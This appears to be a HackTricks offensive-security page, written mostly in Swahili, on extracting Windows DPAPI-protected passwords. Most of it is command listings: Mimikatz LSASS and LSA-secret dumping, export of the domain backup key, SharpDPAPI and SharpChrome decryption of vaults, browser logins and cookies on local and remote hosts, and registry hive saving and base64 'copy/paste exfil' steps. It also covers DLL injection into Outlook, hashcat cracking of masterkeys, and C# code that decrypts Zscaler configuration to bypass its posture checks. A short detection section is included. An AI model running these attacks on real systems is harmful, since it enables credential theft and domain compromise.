# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni nini

Data Protection API (DPAPI) hutumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kwa **usimbaji fiche wa symmetric wa funguo binafsi za asymmetric**, ikitumia siri za mtumiaji au mfumo kama chanzo muhimu cha entropy. Mbinu hii hurahisisha usimbaji fiche kwa developers kwa kuwawezesha kusimba data kwa kutumia ufunguo unaotokana na siri za kuingia za mtumiaji au, kwa usimbaji fiche wa mfumo, siri za uthibitishaji wa domain ya mfumo; hivyo kuondoa hitaji la developers kusimamia ulinzi wa ufunguo wa usimbaji fiche wenyewe.

Njia inayotumika zaidi kutumia DPAPI ni kupitia functions za **`CryptProtectData` na `CryptUnprotectData`**, ambazo huruhusu applications kusimba na kusimbua data kwa kutumia security context ya process iliyoingia kwa sasa. Kwa default, data inaweza kusimbuliwa tu na user au system context ileile iliyoisimba.<sup>[[2]](#references)[[3]](#references)</sup>

Functions hizi pia hupokea **entropy parameter** ya hiari inayotumiwa wakati wa usimbaji na usimbuaji. Data iliyolindwa kwa entropy ya hiari inahitaji thamani hiyo hiyo ya entropy ili kusimbuliwa.<sup>[[2]](#references)[[6]](#references)</sup>

### Uundaji wa users key

DPAPI hutengeneza thamani mahususi ya user (mara nyingi huitwa **pre-key**) kutoka kwenye credentials za user. Uundaji huo hutegemea account na toleo la operating system. Kwa mfano, Impacket hujaribu njia ya HMAC-SHA1 inayotegemea SHA-1 digest ya password ya UTF-16LE, njia nyingine inayotegemea MD4/NT hash ya password, na njia inayotokana na PBKDF2-SHA256 kwa Protected Users. Hii ndiyo sababu offline tooling mara nyingi inaweza kutengeneza material inayohitajika kutoka kwenye plaintext password au NT hash inayopatikana.<sup>[[2]](#references)[[10]](#references)</sup>

Hili ni muhimu hasa kwa sababu ikiwa attacker anaweza kupata password hash ya user, anaweza:

- **Kusimbua data yoyote iliyosimbwa kwa kutumia DPAPI** na key ya user huyo bila kuhitaji kuwasiliana na API yoyote
- Kujaribu **ku-crack password** offline kwa kujaribu kutengeneza DPAPI key sahihi

DPAPI hudumisha **master keys** moja au zaidi kwa kila user badala ya kuunda master key mpya kwa kila protected blob. Kila master key ina **GUID** (Globally Unique Identifier), na encrypted blob huhifadhi taarifa ya master key inayoilinda.<sup>[[2]](#references)</sup>

Master keys huhifadhiwa kwenye directory ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya user. Master-key file huwa na material iliyolindwa na **pre-key** ya user na, kwa domain users, recovery material iliyolindwa na **domain backup key**.<sup>[[2]](#references)</sup>

Kumbuka kwamba **domain key inayotumiwa kusimba master key iko kwenye domain controllers na haibadiliki**, kwa hiyo ikiwa attacker ana access kwenye domain controller, anaweza kupata domain backup key na kusimbua master keys za users wote kwenye domain.<sup>[[2]](#references)</sup>

Encrypted blobs huwa na **GUID ya master key** iliyotumiwa kusimba data iliyo ndani ya headers zake.

> [!TIP]
> DPAPI encrypted blobs huanza na **`01 00 00 00`**

Tafuta master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Hivi ndivyo kundi la Master Keys za mtumiaji litakavyoonekana:

![DPAPI ni nini - Uundaji wa funguo za mtumiaji: Hivi ndivyo kundi la Master Keys za mtumiaji litakavyoonekana](<../../images/image (1121).png>)

### Uundaji wa Machine/System key

Hii ni key inayotumiwa na machine kusimba data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni key maalum inayoweza kufikiwa na mtumiaji wa SYSTEM pekee. Key hii hutumiwa kusimba data inayohitaji kufikiwa na system yenyewe, kama vile credentials za kiwango cha machine au secrets za system nzima.<sup>[[2]](#references)</sup>

Kumbuka kuwa keys hizi **hazina domain backup**, kwa hivyo zinapatikana locally pekee:

- **Mimikatz** inaweza kuifikia kwa kudump LSA secrets kwa kutumia command: `mimikatz lsadump::secrets`
- Secret imehifadhiwa ndani ya registry, kwa hivyo administrator anaweza **kubadilisha ruhusa za DACL ili kuifikia**. Registry path ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction kutoka kwa registry hives pia inawezekana. Kwa mfano, ukiwa administrator kwenye target, hifadhi hives na uziexfiltrate:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Kisha kwenye analysis box yako, rejesha siri ya DPAPI_SYSTEM LSA kutoka kwenye hives na uitumie kusimbua machine-scope blobs (password za scheduled task, service credentials, Wi‑Fi profiles, n.k.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Data Iliyolindwa na DPAPI

Miongoni mwa data binafsi inayolindwa na DPAPI ni:

- Windows creds
- Passwords na data ya auto-completion ya Internet Explorer na Google Chrome
- Passwords za akaunti za E-mail na FTP ya ndani kwa applications kama Outlook na Windows Mail
- Passwords za shared folders, resources, wireless networks, na Windows Vault, pamoja na encryption keys
- Passwords za remote desktop connections, .NET Passport, na private keys kwa madhumuni mbalimbali ya encryption na authentication
- Network passwords zinazosimamiwa na Credential Manager na data binafsi katika applications zinazotumia CryptProtectData, kama Skype, MSN messenger, na nyinginezo
- Encrypted blobs ndani ya registry
- ...

Data inayolindwa na mfumo inajumuisha:
- Wifi passwords
- Scheduled task passwords
- ...

### Chaguo za kutoa master key

- Ikiwa mtumiaji ana domain admin privileges, anaweza kufikia **domain backup key** ili decrypt master keys zote za watumiaji katika domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Kwa **local admin privileges**, inawezekana **access LSASS memory** ili kutoa DPAPI master keys za watumiaji wote walioingia na SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa mtumiaji ana privileges za local admin, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili kufungua machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ikiwa password au hash ya NTLM ya mtumiaji inajulikana, unaweza **kudecrypt master keys za mtumiaji moja kwa moja**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya session kama user, inawezekana kuiomba DC **backup key ya kusimbua master keys kwa kutumia RPC**. Ikiwa wewe ni local admin na user ameingia, unaweza **kuiba session token yake** kwa ajili ya hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodhesha Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Fikia Data Iliyosimbwa kwa DPAPI

### Tafuta data iliyosimbwa kwa DPAPI

**Faili za kawaida za watumiaji zinazolindwa** zinapatikana katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Pia angalia kwa kubadilisha `\Roaming\` kuwa `\Local\` katika paths zilizo hapo juu.

Mifano ya enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata blobs zilizosimbwa kwa DPAPI katika mfumo wa faili, registry na blobs za B64:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo hiyo hiyo) inaweza kutumiwa kusimbua data nyeti kama cookies kwa kutumia DPAPI.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- Mtumiaji wa sasa, usimbuaji wa maingiliano wa logins/cookies zilizohifadhiwa (hufanya kazi hata na cookies za Chrome 127+ zilizo na app-bound kwa sababu key ya ziada hutatuliwa kutoka kwa Credential Manager ya mtumiaji wakati wa kuendesha katika user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Uchanganuzi wa nje ya mtandao unapokuwa na files pekee. Kwanza extract AES state key kutoka kwenye "Local State" ya profile, kisha uitumie ku-decrypt cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage unapokuwa na DPAPI domain backup key (PVK) na admin kwenye host lengwa:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na kusimbua moja kwa moja data ya profile:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Maelezo
- Chrome/Edge builds mpya zaidi zinaweza kuhifadhi baadhi ya cookies kwa kutumia encryption ya "App-Bound". Offline decryption ya cookies hizo mahususi haiwezekani bila app-bound key ya ziada; endesha SharpChrome chini ya context ya user lengwa ili kuipata automatically. Tazama chapisho la Chrome security blog lililotajwa hapa chini.<sup>[[5]](#references)</sup>

### Funguo za ufikiaji na data

- **Tumia SharpDPAPI** kupata credentials kutoka kwenye files zilizo-encryptiwa kwa DPAPI kutoka kwenye session ya sasa:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata credentials info** kama vile data iliyosimbwa kwa njia fiche na guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Fikia masterkeys**:

Decrpyt masterkey ya user anayeomba **domain backup key** kwa kutumia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Tool ya **SharpDPAPI** pia inasaidia arguments hizi kwa masterkey decryption (angalia jinsi inavyowezekana kutumia `/rpc` kupata domains backup key, `/password` kutumia plaintext password, au `/pvk` kubainisha faili ya DPAPI domain private key...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Fungua data kwa kutumia masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Zana ya **SharpDPAPI** pia inasaidia arguments hizi za decryption ya `credentials|vaults|rdg|keepass|triage|blob|ps` (angalia jinsi inavyowezekana kutumia `/rpc` kupata domain backup key, `/password` kutumia password ya plaintext, `/pvk` kubainisha faili la private key la DPAPI domain, `/unprotect` kutumia session ya mtumiaji wa sasa...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Kutumia DPAPI prekey/credkey moja kwa moja (hakuna password inayohitajika)

Ikiwa unaweza kudump LSASS, Mimikatz mara nyingi huonyesha DPAPI key ya kila logon inayoweza kutumika kudekripta masterkeys za mtumiaji bila kujua password iliyo wazi. Pitisha value hii moja kwa moja kwenye tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Decrypt data fulani kwa kutumia **session ya mtumiaji wa sasa**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Usimbuaji wa offline kwa kutumia Impacket dpapi.py

Ikiwa una SID na password ya user victim (au NT hash), unaweza kusimbua DPAPI masterkeys na Credential Manager blobs kabisa ukiwa offline kwa kutumia Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Tambua artefacts zilizo kwenye diski:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ikiwa file transfer tooling haifanyi kazi vizuri, badilisha files kuwa base64 kwenye host kisha unakili output:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Decrypt masterkey kwa kutumia SID na password/hash ya user:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Tumia masterkey iliyodecryptiwa ku-decrypt credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Mtiririko huu mara nyingi hurejesha credentials za domain zilizohifadhiwa na apps zinazotumia Windows Credential Manager, ikijumuisha akaunti za kiutawala (k.m., `*_adm`).

---

### Kushughulikia Entropy ya Hiari ("Third-party entropy")

Baadhi ya applications hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii blob haiwezi ku-decryptiwa, hata kama masterkey sahihi inajulikana. Kwa hiyo, kupata entropy ni muhimu unapolenga credentials zilizolindwa kwa njia hii (k.m. Microsoft Outlook, baadhi ya VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya user-mode inayoweka hooks kwenye functions za DPAPI ndani ya target process na kurekodi kwa uwazi optional entropy yoyote inayotolewa. Kuendesha EntropyCapture katika mode ya **DLL-injection** dhidi ya processes kama `outlook.exe` au `vpnclient.exe` kutatoa file inayohusisha kila entropy buffer na calling process pamoja na blob. Entropy iliyonaswa inaweza baadaye kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili ku-decrypt data.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Kuvunja masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilianzisha muundo wa masterkey wa **context 3** kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3), hivyo kuwezesha cracking inayoharakishwa na GPU ya passwords za watumiaji moja kwa moja kutoka kwenye faili la masterkey. Kwa hivyo, attackers wanaweza kufanya word-list au brute-force attacks bila kuingiliana na mfumo lengwa.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) ina-automate mchakato huu:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Zana pia inaweza kuchanganua Credential na Vault blobs, kuzifungua kwa kutumia keys zilizocrackiwa na ku-export passwords za cleartext.<sup>[[8]](#references)</sup>


### Kufikia data ya mashine nyingine

Katika **SharpDPAPI na SharpChrome** unaweza kubainisha option ya **`/server:HOST`** ili kufikia data ya mashine ya mbali. Bila shaka, unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inachukuliwa kuwa **domain backup encryption key inajulikana**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni tool inayotoa kiotomatiki users na computers wote kutoka LDAP directory na kutoa domain controller backup key kupitia RPC. Script kisha itatatua IP address za computers zote na kufanya smbclient kwenye computers zote ili kupata DPAPI blobs zote za users wote na kusimbua kila kitu kwa kutumia domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa kutumia orodha ya computers iliyotolewa kutoka LDAP, unaweza kupata kila sub network hata kama hukuijua hapo awali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kudump secrets zinazolindwa na DPAPI kiotomatiki. Toleo la 2.x lilianzisha:<sup>[[9]](#references)</sup>

* Ukusanyaji sambamba wa blobs kutoka kwa mamia ya hosts
* Uchanganuzi wa **context 3** masterkeys na integration ya kiotomatiki ya Hashcat cracking
* Support kwa cookies zilizosimbwa za Chrome "App-Bound" (angalia sehemu inayofuata)
* Mode mpya ya **`--snapshot`** ya kupoll endpoints mara kwa mara na kutofautisha blobs mpya zilizoundwa

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni C# parser ya masterkey/credential/vault files inayoweza kutoa formats za Hashcat/JtR na kwa hiari kuanzisha cracking kiotomatiki. Inasupport kikamilifu machine na user masterkey formats hadi Windows 11 24H1.<sup>[[8]](#references)</sup>


## Utambuzi wa kawaida

- Access kwenye files zilizo katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na directories nyingine zinazohusiana na DPAPI.
- Hasa kutoka kwa network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au tooling inayofanana kufikia LSASS memory au kudump masterkeys.
- Event **4662**: *Operesheni ilifanywa kwenye object* – inaweza kuhusianishwa na access kwenye **`BCKUPKEY`** object.
- Event **4673/4674** wakati process inaomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilities za 2023-2025 na mabadiliko ya ecosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Novemba 2023). Attacker mwenye network access angeweza kudanganya domain member ili ipate DPAPI backup key hasidi, na hivyo kuruhusu kusimbua user masterkeys. Ilipigwa patch katika cumulative update ya Novemba 2023 – administrators wanapaswa kuhakikisha kuwa DCs na workstations zimewekewa patches zote.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Julai 2024) ilibadilisha legacy DPAPI-only protection na kuongeza key nyingine iliyohifadhiwa chini ya **Credential Manager** ya user. Kusimbua cookies offline sasa kunahitaji DPAPI masterkey na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurecover key hiyo ya ziada zinapoendeshwa kwa user context.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector huhifadhi configuration files kadhaa chini ya `C:\ProgramData\Zscaler` (kwa mfano `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila file limesimbwa kwa **DPAPI (Machine scope)** lakini vendor hutoa **custom entropy** ambayo *hukokotolewa wakati wa runtime* badala ya kuhifadhiwa kwenye disk.<sup>[[1]](#references)</sup>

Entropy hujengwa upya kutokana na elements mbili:

1. Secret iliyowekwa moja kwa moja ndani ya `ZSACredentialProvider.dll`.
2. **SID** ya Windows account ambayo configuration ni yake.

Algorithm iliyotekelezwa na DLL ni sawa na:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Kwa sababu secret imepachikwa ndani ya DLL inayoweza kusomwa kutoka kwenye diski, **attacker yeyote wa ndani aliye na haki za SYSTEM anaweza kuzalisha upya entropy kwa SID yoyote** na kusimbua blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Usimbuaji hutoa usanidi kamili wa JSON, ukiwa na kila **ukaguzi wa mkao wa kifaa** na thamani yake inayotarajiwa – taarifa yenye thamani kubwa sana unapojaribu bypass za upande wa client.

> TIP: artefacts nyingine zilizosimbwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zinalindwa na DPAPI **bila entropy** (`16` zero bytes). Kwa hiyo zinaweza kusimbuliwa moja kwa moja kwa `ProtectedData.Unprotect` mara tu privileges za SYSTEM zinapopatikana.

## References

- [1] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kupita ukaguzi wa mkao wa Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Siri za DPAPI. Uchambuzi wa usalama na urejeshaji wa data katika DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Kusoma Siri Zilizosimbwa na DPAPI kwa Mimikatz na C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Kuboresha usalama wa cookies za Chrome kwenye Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Utoaji Rahisi wa Optional Entropy ya DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 – Maelezo ya toleo](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – Hazina ya GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – Ukurasa wa mradi kwenye PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Matumizi mabaya ya AD ACL, kuvunja Argon2 ya KeePassXC, na usimbuaji wa DPAPI hadi kuwa admin wa DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Matumizi na chaguo](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
